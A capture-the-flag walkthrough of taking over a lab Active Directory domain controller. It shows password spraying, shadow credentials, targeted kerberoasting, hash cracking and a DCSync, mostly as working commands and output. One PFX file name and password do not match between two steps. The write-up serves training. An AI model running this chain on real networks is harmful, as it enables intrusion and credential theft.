---
cover: ../.gitbook/assets/recovery.jpeg
coverY: 0
coverHeight: 324
---

# Recovery(Windows)

## Initial Enumeration :

### NMAP :

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-08-27 08:50:51Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: recovery.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-27T08:52:29+00:00; -1h59m56s from scanner time.
| ssl-cert: Subject: commonName=DC01.recovery.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.recovery.local
| Issuer: commonName=recovery-DC01-CA/domainComponent=recovery
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-15T21:49:23
| Not valid after:  2026-10-15T21:49:23
| MD5:     6650 89d9 7a61 9af7 b7ed 338b 9f3d 45d8
| SHA-1:   084e fd96 6ec8 d98a 8dd0 8a21 988d e03b 376e ad99
| SHA-256: b1cb a531 5f43 d614 8b7c 95a6 7986 7d9a 1891 6ef4 5900 e046 83b1 e414 8392 bfde
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: recovery.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.recovery.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.recovery.local
| Issuer: commonName=recovery-DC01-CA/domainComponent=recovery
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-15T21:49:23
| Not valid after:  2026-10-15T21:49:23
| MD5:     6650 89d9 7a61 9af7 b7ed 338b 9f3d 45d8
| SHA-1:   084e fd96 6ec8 d98a 8dd0 8a21 988d e03b 376e ad99
| SHA-256: b1cb a531 5f43 d614 8b7c 95a6 7986 7d9a 1891 6ef4 5900 e046 83b1 e414 8392 bfde
|_ssl-date: 2026-08-27T08:52:30+00:00; -1h59m56s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: recovery.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.recovery.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.recovery.local
| Issuer: commonName=recovery-DC01-CA/domainComponent=recovery
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-15T21:49:23
| Not valid after:  2026-10-15T21:49:23
| MD5:     6650 89d9 7a61 9af7 b7ed 338b 9f3d 45d8
| SHA-1:   084e fd96 6ec8 d98a 8dd0 8a21 988d e03b 376e ad99
| SHA-256: b1cb a531 5f43 d614 8b7c 95a6 7986 7d9a 1891 6ef4 5900 e046 83b1 e414 8392 bfde
|_ssl-date: 2026-08-27T08:52:29+00:00; -1h59m56s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: recovery.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-27T08:52:30+00:00; -1h59m56s from scanner time.
| ssl-cert: Subject: commonName=DC01.recovery.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.recovery.local
| Issuer: commonName=recovery-DC01-CA/domainComponent=recovery
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-15T21:49:23
| Not valid after:  2026-10-15T21:49:23
| MD5:     6650 89d9 7a61 9af7 b7ed 338b 9f3d 45d8
| SHA-1:   084e fd96 6ec8 d98a 8dd0 8a21 988d e03b 376e ad99
| SHA-256: b1cb a531 5f43 d614 8b7c 95a6 7986 7d9a 1891 6ef4 5900 e046 83b1 e414 8392 bfde
5357/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49706/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49719/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49815/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

### SMB (135,139,445) :

* We check if we have access as Null User

```bash
┌──(kali㉿kali)-[~/Desktop/ronin66/recovery]
└─$ nxc smb recovery.local -u '' -p ''                  
SMB         172.16.18.19    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:recovery.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.18.19    445    DC01             [+] recovery.local\: 
```

* Now we try to see if we are able to list the shares anonymously but we get an Access Denied

```bash
┌──(kali㉿kali)-[~/Desktop/ronin66/recovery]
└─$ nxc smb recovery.local -u '' -p '' --shares
SMB         172.16.18.19    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:recovery.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.18.19    445    DC01             [+] recovery.local\: 
SMB         172.16.18.19    445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

* Now we try listing the shares as a `Guest` User

```bash
┌──(kali㉿kali)-[~/Desktop/ronin66/recovery]
└─$ nxc smb recovery.local -u 'Guest' -p '' --shares
SMB         172.16.18.19    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:recovery.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.18.19    445    DC01             [-] recovery.local\Guest: STATUS_ACCOUNT_DISABLED 
```

* The Next thing we tried was to list the users Anonymously and we successfully got a list of users in the Domain.

```bash
┌──(kali㉿kali)-[~/Desktop/ronin66/recovery]
└─$ nxc smb recovery.local -u '' -p '' --users      
SMB         172.16.18.19    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:recovery.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.18.19    445    DC01             [+] recovery.local\: 
SMB         172.16.18.19    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         172.16.18.19    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         172.16.18.19    445    DC01             s.connery                     2025-10-14 12:37:26 0        
SMB         172.16.18.19    445    DC01             m.gibson                      2025-10-14 12:38:51 0        
SMB         172.16.18.19    445    DC01             j.statham                     2025-10-14 12:40:40 0       ChangeMe2025! 
SMB         172.16.18.19    445    DC01             s.johansson                   2025-10-17 13:46:49 0        
SMB         172.16.18.19    445    DC01             j.ortega                      2025-10-14 13:17:02 0        
SMB         172.16.18.19    445    DC01             w.dafoe                       2025-10-17 13:44:57 0        
SMB         172.16.18.19    445    DC01             [*] Enumerated 7 local users: RECOVERY

```

* Surprisingly, We found a password in the Description but we didn’t know the user who had this as a password so we created a `users.txt` file which contained all the users in the domain

```bash
┌──(kali㉿kali)-[~/Desktop/ronin66/recovery]
└─$ nano users.txt
```

* Now we use password spraying against all the users in the domain.

```bash
┌──(kali㉿kali)-[~/Desktop/ronin66/recovery]
└─$ nxc smb recovery.local -u users.txt -p 'ChangeMe2025!'
SMB         172.16.18.19    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:recovery.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.18.19    445    DC01             [-] recovery.local\s.connery:ChangeMe2025! STATUS_LOGON_FAILURE 
SMB         172.16.18.19    445    DC01             [-] recovery.local\m.gibson:ChangeMe2025! STATUS_LOGON_FAILURE 
SMB         172.16.18.19    445    DC01             [-] recovery.local\j.statham:ChangeMe2025! STATUS_LOGON_FAILURE 
SMB         172.16.18.19    445    DC01             [-] recovery.local\s.johansson:ChangeMe2025! STATUS_LOGON_FAILURE 
SMB         172.16.18.19    445    DC01             [+] recovery.local\j.ortega:ChangeMe2025! 
```

* We successfully identified that this password was for the user `j.ortega` .

## Bloodhound :

### Collecting the loot :

* Now since we had a valid pair of credentials, we collect the bloodhound loot

```bash
┌──(kali㉿kali)-[~/Desktop/ronin66/recovery]
└─$ nxc ldap recovery.local -u 'j.ortega' -p 'ChangeMe2025!' --bloodhound --collection all --dns-server 172.16.18.19
LDAP        172.16.18.19    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:recovery.local) (signing:None) (channel binding:Never) 
LDAP        172.16.18.19    389    DC01             [+] recovery.local\j.ortega:ChangeMe2025! 
LDAP        172.16.18.19    389    DC01             Resolved collection methods: psremote, objectprops, container, group, trusts, localadmin, rdp, dcom, acl, session
LDAP        172.16.18.19    389    DC01             Done in 0M 45S
LDAP        172.16.18.19    389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_172.16.18.19_2026-08-27_070942_bloodhound.zip
```

* We go ahead and analyze the collected loot.

### Bloodhound Analysis :

* We found out that our current user `j.ortega` has `AddKeyCredentialLink` privilege over the user `s.connery` .

<figure><img src="../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

## Shell as `s.connery` :

* This privilege could be abused by performing a shadow credentials attack using a popular tool named `pywhisker` .

{% embed url="https://github.com/ShutdownRepo/pywhisker" %}

```bash
┌──(.venv)─(kali㉿kali)-[~/…/ronin66/recovery/pywhisker/pywhisker]
└─$ python3 pywhisker.py -d "recovery.local" -u "j.ortega" -p 'ChangeMe2025!' --target "s.connery" --action "add"                          
[*] Searching for the target account
[*] Target user found: CN=s.connery,CN=Users,DC=recovery,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 37d2f3df-b5e7-58f6-43d2-e6b3c3daf31f
[*] Updating the msDS-KeyCredentialLink attribute of s.connery
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: VpYN2WQP.pfx
/home/kali/Desktop/ronin66/recovery/pywhisker/pywhisker/pywhisker.py:132: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  cert_obj = x509.load_pem_x509_certificate(pem_cert_data, default_backend())
[+] PFX exportiert nach: VpYN2WQP.pfx
[i] Passwort für PFX: mmYlygl92tKCImb8hdzX
[+] Saved PFX (#PKCS12) certificate & key at path: VpYN2WQP.pfx
[*] Must be used with password: mmYlygl92tKCImb8hdzX
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

* Now we use the `PKINIT Tools` to request a TGT and then retrieve the NT Hash of the user `s.connery` .

{% embed url="https://github.com/dirkjanm/PKINITtools" %}

```bash
┌──(.venv)─(kali㉿kali)-[~/…/ronin66/recovery/pywhisker/pywhisker]
└─$ python3 PKINITtools/gettgtpkinit.py -cert-pfx VpYN2WQP.pfx -pfx-pass 'mmYlygl92tKCImb8hdzX' "recovery.local/s.connery" s_connery.ccache
2026-08-27 05:20:47,943 minikerberos INFO     Loading certificate and key from file
2026-08-27 05:20:47,973 minikerberos INFO     Requesting TGT
2026-08-27 05:21:05,914 minikerberos INFO     AS-REP encryption key (you might need this later):
2026-08-27 05:21:05,915 minikerberos INFO     accb5fa08a57cd82ba88216cb89f8553cff4c2b04378d8a07abb6431eacda47c
2026-08-27 05:21:05,920 minikerberos INFO     Saved TGT to file
                                                                                                                                                                                                                                            
┌──(.venv)─(kali㉿kali)-[~/…/ronin66/recovery/pywhisker/pywhisker]
└─$ export KRB5CCNAME=s_connery.ccache                                                                                                     
                                                                                                                                                                                                                                            
┌──(.venv)─(kali㉿kali)-[~/…/ronin66/recovery/pywhisker/pywhisker]
└─$ python3 PKINITtools/getnthash.py  -key accb5fa08a57cd82ba88216cb89f8553cff4c2b04378d8a07abb6431eacda47c  "recovery.local/s.connery"
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
406345455039820bb7e5fad7cf82c556
```

* Now we have successfully retrieved the NT Hash for the user `s.connery` and now we head over to `Bloodhound` to see what privileges does this user has.

<figure><img src="../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

* We identified that this user is a member of the `Remote Management Users` Group which means we can now use `evil-winrm` to access the DC
* And at this point we got our User flag in the `C:\Users\Public` directory.

<figure><img src="../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

## Compromising `s.johansson` :

* Now we started enumerating the machine through the `winrm` access and found a share named `Utils` which seemed to be out of the ordinary files.

<figure><img src="../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

* In this folder we found an executable file named as `mount.exe` so we downloaded it

```bash
*Evil-WinRM* PS C:\> cd Utils
*Evil-WinRM* PS C:\Utils> dir

    Directory: C:\Utils

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/15/2025   6:09 PM         113774 mount.exe

*Evil-WinRM* PS C:\Utils> download mount.exe
                                        
Info: Downloading C:\Utils\mount.exe to mount.exe
                                        
Info: Download successful!

```

* Now we used the `strings` command to check all the strings in the executable and found a cleartext password

```bash
┌──(kali㉿kali)-[~/Desktop/ronin66/recovery]
└─$ strings mount.exe
```

<figure><img src="../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

* Now we sprayed this password across all the users and found out that it was the user `s.johansson` whose password we were able to retrieve.

```bash
┌──(kali㉿kali)-[~/Desktop/ronin66/recovery]
└─$ nxc smb recovery.local -u users.txt -p 'R0ckth!spass678'                                                        
SMB         172.16.18.19    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:recovery.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.18.19    445    DC01             [-] recovery.local\s.connery:R0ckth!spass678 STATUS_LOGON_FAILURE 
SMB         172.16.18.19    445    DC01             [-] recovery.local\m.gibson:R0ckth!spass678 STATUS_LOGON_FAILURE 
SMB         172.16.18.19    445    DC01             [-] recovery.local\j.statham:R0ckth!spass678 STATUS_LOGON_FAILURE 
SMB         172.16.18.19    445    DC01             [+] recovery.local\s.johansson:R0ckth!spass678
```

* Now we check this user’s permission in Bloodhound and found that this user had an `OutboundObjectControl` and had `WriteSPN` permission over the user `W.DAFOE` which could be abused to perform a `targetedkerberoast` attack.

<figure><img src="../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://github.com/ShutdownRepo/targetedKerberoast" %}

```bash
┌──(.venv)─(kali㉿kali)-[~/Desktop/ronin66/recovery/targetedKerberoast]
└─$ python3 targetedKerberoast.py -v -d 'recovery.local' -u 's.johansson' -p 'R0ckth!spass678' 
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (w.dafoe)
[+] Printing hash for (w.dafoe)
$krb5tgs$23$*w.dafoe$RECOVERY.LOCAL$recovery.local/w.dafoe*$b24245d2d02375da388069d9f2b98c6a$c0c444a4a7adc9fabf28d99185661cec1e8a9d0784066857bcf865edc8ec3e35192af026b597db9724a5da15706a857adce0cf7f8ba90efc903e9f4ec939985636a280fc90d011b401c8e49ca99ed40c41dd4822581fdf66bce1b8b9ecbfea88e3b6f6d65239ec02b399335f9bb11084d74338908ac82f9b132ea11654785952ae56073f6471055dd7592d0d7c8701103aa25d28bf71a4681c1911f8c32229b48fd516a4aa6268f5e1889c79de29e3f690772c333bd736886594079f1e4e4e9580136ad9c113b0735b51bfb851e8e30a063a77253614b359a33a02dd1a7c68cc3b387c1b5b5e2f61765e2c368ee7f54a61b95fa7a2c85488afb0e4c1ddf0f56c7104056c76feee73697fa2f876783be054be2aee2b04320f3e4011059b10277c16b26f798c1cb14ce632beb00fefbdbb6c9772bac06c79ae1faba01e38c960eac70148e294d8117fd51dd12a37243a36c1c3dbfb36765bbea4fddcd3554f62a04173ae382a3004f7ad0fac9aad5a42832add52c58239bb15d9d98a20de38c351957cf3425c1ace4a212260f290dcd9a6d33e97ac352b010424bff606e9186a2e88cf6b2331f92c33028ba0511fc5753e0893ba61b553234fe0feb67428d3453da18e966d4e508b7799f8042d1bc8bad68e6924e681288a0182e1ad5554e912c1cffac0a23812305be67c62068795af335a195770f5e402aa5ff3cef4192fcbd90720be63367644a3990a4100d8d6498002e047fde7731fb44104a158f1c884ba7e8421e4f56fba8166963d30922f7932dccfac88749e59f50efd62a904d1d6a505558e1ea05aea7f779d8ab62e8fc08cbd534144aef9efc48894703c84209bc50c0fd3ee9ed4e09cb2b860ad6540ff836a9fde342e9a49425ee49f8b3ab913ff43393170960ab226c3fe6ff018c3daa051b74af01e838b79abbf3386fcf4b6dd856ebedcf2fd998357d2cf0fc95f7005d90f39fe00d20bd3fc968f0f8aed0024b06290f2b1d1e1cb6b42f84834b444c27e40db54453edae936970a2118b741dcb48c1ac5c17280ea05c76b0ddddc596c9dea5262718fb2a083ac2c95a85918f8d2bbacdb6b2d82ec9a902f7323e1811658d9bd933bca83c53a8ae548d151907a1f544ffd7f387661e617d7d9f33dffda193f56bb5269d69768f0778d33a13fdd1976761e8c5336995cc1caafd6ecd3f70e73efabec97fbfbad954c5ef9d436a9229c517ae432438156af8e2bb7bdc0d554670f7581d382d558a94ef95c23a36c47fdc9ff4603f18c279c476db4d613872b6404c544e729a2a1cdcf15e62c63abe43e05abce511cac65ade4ae6c375986d7c65ffb4175f4d75707754de903cb6c8b6f8e8cb371ed3a9e34897ef28c82be99171fe8654104fc3120d1fe63b804e1f25d3bdabb610185776a6e960863bb97eef2fe3615af85a59b37301be8a17cc03f05cc788a53851ae12b5b56f3207d28f3ad7c8fd5b203f52c2790be71a615f03e638f397744647473a0af475dcb4e1f082722d9b58b6dc2b5965bcfb869a5ba6d34669fb007f5850b1f
[VERBOSE] SPN removed successfully for (w.dafoe)
```

* Now we crack this hash using `john`

```bash
┌──(.venv)─(kali㉿kali)-[~/.john]
└─$ john --format=krb5tgs /home/kali/Desktop/ronin66/recovery/targetedKerberoast/newhash.txt  --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mdmdancer3!      (?)     
1g 0:00:00:02 DONE (2026-09-07 08:49) 0.3663g/s 2078Kp/s 2078Kc/s 2078KC/s me y u..mdjf1208
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

## Shell as `Administrator` :

* Now we see the user `w.dafoe` permission in Bloodhound

<figure><img src="../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

* We see that this user has `GenericAll` permissions over DC Machine account so essentially we can perform a Shadow Credentials attack against the machine account using `pywhisker`.

{% embed url="https://github.com/ShutdownRepo/pywhisker" %}

```bash
┌──(.venv)─(kali㉿kali)-[~/Desktop/ronin66/recovery/pywhisker]
└─$ python3 pywhisker/pywhisker.py -d "recovery.local" -u "w.dafoe" -p 'mdmdancer3!' --target "DC01$" --action "add"
[*] Searching for the target account
[*] Target user found: CN=DC01,OU=Domain Controllers,DC=recovery,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 6d17a0cd-c9c7-7548-37ae-2231da85af22
[*] Updating the msDS-KeyCredentialLink attribute of DC01$
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: B2AV4hhE.pfx
/home/kali/Desktop/ronin66/recovery/pywhisker/pywhisker/pywhisker.py:132: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  cert_obj = x509.load_pem_x509_certificate(pem_cert_data, default_backend())
[+] PFX exportiert nach: B2AV4hhE.pfx
[i] Passwort für PFX: k1k4o1x4sIO3mQcFjttr
[+] Saved PFX (#PKCS12) certificate & key at path: B2AV4hhE.pfx
[*] Must be used with password: k1k4o1x4sIO3mQcFjttr
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

* Now we use this `PFX` file to get a TGT using PKINIT Tools

```bash
┌──(.venv)─(kali㉿kali)-[~/Desktop/ronin66/recovery/pywhisker]
└─$ python3 PKINITtools/gettgtpkinit.py -cert-pfx 9dbLZuPz.pfx -pfx-pass 'FDD6AJOtITfQ8RoR2yb4' "recovery.local/dc01$" dc01.ccache
2026-09-07 12:32:28,104 minikerberos INFO     Loading certificate and key from file
2026-09-07 12:32:28,125 minikerberos INFO     Requesting TGT
2026-09-07 12:32:28,509 minikerberos INFO     AS-REP encryption key (you might need this later):
2026-09-07 12:32:28,509 minikerberos INFO     6c55a149c03efa1e5d6fd180aec19c2954cc205b4285e9c7b11cbe5923fe11bc
2026-09-07 12:32:28,524 minikerberos INFO     Saved TGT to file
```

* Now we export the TGT to `KRB5CCNAME`

```bash
──(.venv)─(kali㉿kali)-[~/…/ronin66/recovery/pywhisker/PKINITtools]
└─$ export KRB5CCNAME=dc01.ccache  
```

* Now we retrieve the NT Hash for the Machine Account

```bash
┌──(.venv)─(kali㉿kali)-[~/Desktop/ronin66/recovery/pywhisker]
└─$ python3 PKINITtools/getnthash.py  -key 6c55a149c03efa1e5d6fd180aec19c2954cc205b4285e9c7b11cbe5923fe11bc  "recovery.local/dc01$" 
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
c389c0de0dab482fb773882d9fa2b51c
```

* Now we can use it and perform a DCSync and dump all the Hashes using `impacket-secretsdump` to get the Administrator hash.

```bash
┌──(kali㉿kali)-[~/Desktop/ronin66/recovery/pywhisker]
└─$ impacket-secretsdump 'recovery.local/dc01$'@dc01.recovery.local -hashes ':c389c0de0dab482fb773882d9fa2b51c' -dc-ip 172.16.18.19
Impacket v0.14.0.dev0+20260708.160148.cbcf4f86 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
----------------------snip------------------------------------------------------
```

* Now since we have Administrator hash, we use `evil-winrm` access and got our root flag which is `root.flg`

<figure><img src="../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

* Now we have successfully Solved this machine!!!
